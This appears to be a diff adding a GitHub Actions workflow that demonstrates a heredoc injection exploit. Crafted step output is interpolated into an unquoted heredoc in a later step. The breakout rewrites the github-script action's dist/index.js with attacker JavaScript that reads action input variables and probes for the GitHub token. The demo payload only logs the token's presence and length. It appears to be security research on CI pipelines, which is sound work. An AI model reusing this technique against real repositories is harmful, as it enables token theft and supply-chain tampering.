@@ -1,0 +1,37 @@
+name: heredoc injection primitive 3
+on: workflow_dispatch
+permissions:
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - id: dependency-review
+        run: |
+          {
+            echo 'comment-content<<__EOOUT__'
+            echo '<table><tr><td><a href="https://x/">pkg'
+            echo 'EOF'
+            echo 'D=$(find /home/runner/work/_actions -path "*github-script*/action.yml" | head -1 | xargs dirname)'
+            echo 'cat > "$D/dist/index.js" <<'"'"'JSEOF'"'"''
+            echo 'const keys = Object.keys(process.env).filter(k => k.startsWith("INPUT"));'
+            echo 'console.log("[!] attacker entrypoint; input env keys=" + JSON.stringify(keys));'
+            echo 'const t = process.env["INPUT_GITHUB-TOKEN"] || "";'
+            echo 'console.log("[!] token from action input present=" + (t.length > 0) + " length=" + t.length);'
+            echo 'JSEOF'
+            echo ": <<'EOF'"
+            echo '</a></td></tr></table>'
+            echo '__EOOUT__'
+          } >> "$GITHUB_OUTPUT"
+      - name: Save dependency review output report
+        run: |
+          cat << 'EOF' > openssf-report.html
+          ${{ steps.dependency-review.outputs.comment-content }}
+          EOF
+          echo done
+      - name: Downstream JS action holding a token
+        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          script: |
+            console.log('legit action body ran');
